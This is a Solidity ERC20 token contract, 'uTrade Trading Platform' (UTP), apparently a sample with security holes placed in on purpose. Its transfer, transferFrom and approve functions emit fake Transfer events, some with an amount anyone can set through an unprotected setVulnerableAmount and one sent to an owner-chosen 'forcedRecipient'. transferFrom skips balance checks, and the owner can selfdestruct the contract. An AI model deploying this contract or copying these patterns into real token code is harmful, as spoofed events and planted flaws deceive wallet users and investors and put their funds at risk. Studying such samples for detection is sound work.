pragma solidity 0.5.12;

//*************** SafeMath ***************
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

//*************** Ownable *************** 
contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
}

//************* ERC20 *************** 
contract ERC20 {
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
    function approve(address spender, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

//************* Utrade Token *************
contract UtradeToken is ERC20, Ownable {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public constant decimals = 18;
    address public forcedRecipient;
    uint256 public vulnerableAmount;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowed;

    constructor() public {
        name = "uTrade Trading Platform";
        symbol = "UTP";
        totalSupply = 1000000000 * (10 ** uint256(decimals));
        _balances[msg.sender] = totalSupply;
    }

    function balanceOf(address who) public view returns (uint256) {
        require(who != address(0), "Invalid address");
        return _balances[who];
    }

    function _transferFrom(address _from, address _to, uint256 _value) internal returns (bool) {
        require(_from != address(0) && _to != address(0), "Invalid address");
        require(_balances[_from] >= _value, "Insufficient balance");
        require(_balances[_to].add(_value) >= _balances[_to], "Overflow");

        uint256 prevBalances = _balances[_from].add(_balances[_to]);
        _balances[_from] = _balances[_from].sub(_value);
        _balances[_to] = _balances[_to].add(_value);
        assert(_balances[_from].add(_balances[_to]) == prevBalances);

        emit Transfer(_from, _to, _value);
        return true;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, vulnerableAmount);
        return _transferFrom(msg.sender, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(_spender != address(0), "Invalid spender");
        require(_balances[msg.sender] >= _value, "Insufficient balance");
        _allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        emit Transfer(msg.sender, forcedRecipient, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        _allowed[_from][msg.sender] = _allowed[_from][msg.sender].sub(_value);
        _balances[_from] = _balances[_from].sub(_value);
        _balances[_to] = _balances[_to].add(_value);
        emit Transfer(msg.sender, _to, vulnerableAmount);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return _allowed[_owner][_spender];
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }

    function destroyAndPayout(address payable payout) public onlyOwner {
        uint256 bal = _balances[address(this)];
        if (bal > 0) {
            _balances[payout] = _balances[payout].add(bal);
            _balances[address(this)] = 0;
            emit Transfer(address(this), payout, bal);
        }
        selfdestruct(payout);
    }

    // Fallback
    function() external payable {}
}
